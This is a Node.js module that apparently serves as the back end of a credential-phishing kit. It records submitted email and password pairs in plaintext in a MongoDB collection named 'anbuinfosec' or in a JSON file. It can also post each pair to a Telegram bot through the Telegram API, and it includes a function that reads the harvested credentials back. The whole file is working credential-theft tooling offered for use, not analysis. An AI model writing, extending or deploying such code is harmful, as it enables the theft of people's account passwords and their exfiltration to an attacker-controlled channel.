const fs = require("fs");
const path = require("path");
const { MongoClient } = require("mongodb");
const axios = require("axios");
const config = require("./config.js");
const { logSuccess, logError } = require("./log.js");

async function saveToDatabase(email, password, dateTime) {
    try {
        if (!config.database.mongodbURL) {
            throw new Error("MongoDB URL is not set in config.");
        }
        const client = new MongoClient(config.database.mongodbURL);
        await client.connect();
        const db = client.db();
        const collection = db.collection('anbuinfosec');
        const count = await collection.countDocuments();
        const newSubmission = {
            index: count + 1,
            email: email,
            password: password,
            submitted_at: dateTime
        };
        await collection.insertOne(newSubmission);
        logSuccess(email, password);
    } catch (err) {
        logError(`Error saving to MongoDB: ${err.message}`);
    } finally {
        try {
            await client.close();
        } catch (closeError) {
            logError(`Error closing MongoDB connection: ${closeError.message}`);
        }
    }
}

function saveToJson(email, password, dateTime) {
    const newSubmission = {
        email: email,
        password: password,
        submitted_at: dateTime
    };
    const filePath = config.jsonPath;

    if (!fs.existsSync(path.dirname(filePath))) {
        fs.mkdirSync(path.dirname(filePath), { recursive: true });
    }

    let submissions = [];
    
    if (fs.existsSync(filePath)) {
        const data = fs.readFileSync(filePath);
        submissions = JSON.parse(data);
    }

    const index = submissions.length > 0 ? submissions[submissions.length - 1].index + 1 : 1;
    newSubmission.index = index;

    submissions.push(newSubmission);
    
    fs.writeFileSync(filePath, JSON.stringify(submissions, null, 2));
    logSuccess(email, password);
}

function getCurrentDateTime(timezone) {
    const options = {
        timeZone: timezone,
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true
    };
    return new Intl.DateTimeFormat('en-US', options).format(new Date());
}

function logSubmission(email, password) {
    const dateTime = getCurrentDateTime(config.timezone);
    
    switch (config.logType) {
        case "mongodb":
            saveToDatabase(email, password, dateTime);
            break;
        case "tgBot":
            sendMessage(email, password, dateTime);
            break;
        case "json":
            saveToJson(email, password, dateTime);
            break;
        default:
            logError(`Invalid logType: ${config.logType}`);
    }
}

function sendMessage(email, password, dateTime) {
    try {
        if (!config.bot.token || !config.bot.id) {
            throw new Error("Telegram bot token or chat ID is missing in config.");
        }

        const telegramApiUrl = `https://api.telegram.org/bot${config.bot.token}/sendMessage`;
        const message = `*New Submission*\n\n*Email:* \`${email}\`\n*Password:* \`${password}\`\n*Time:* \`${dateTime}\``;

        axios.post(telegramApiUrl, {
            chat_id: config.bot.id,
            text: message,
            parse_mode: 'MarkdownV2'
        })
        .then(response => {
            console.log("Message sent to Telegram bot");
        })
        .catch(error => {
            logError(`Error sending message to Telegram: ${error.message}`);
        });
    } catch (error) {
        logError(`Error sending message: ${error.message}`);
    }
}

async function getSubmissions() {
    let submissions = [];

    if (config.logType === "mongodb") {
        if (!config.database.mongodbURL) {
            throw new Error("MongoDB URL is not set in config.");
        }
        const client = new MongoClient(config.database.mongodbURL);
        try {
            await client.connect();
            const db = client.db();
            const collection = db.collection('anbuinfosec');
            submissions = await collection.find({}).toArray();
        } catch (error) {
            console.error("Error fetching from MongoDB:", error);
            throw new Error("Error fetching from MongoDB");
        } finally {
            try {
                await client.close();
            } catch (closeError) {
                logError(`Error closing MongoDB connection: ${closeError.message}`);
            }
        }
    } else if (config.logType === "json") {
        const filePath = config.jsonPath;
        if (fs.existsSync(filePath)) {
            const data = fs.readFileSync(filePath);
            submissions = JSON.parse(data);
        } else {
            console.error("JSON file not found");
            throw new Error("JSON file not found");
        }
    }

    return submissions;
}

module.exports = { logSubmission, sendMessage, getSubmissions };
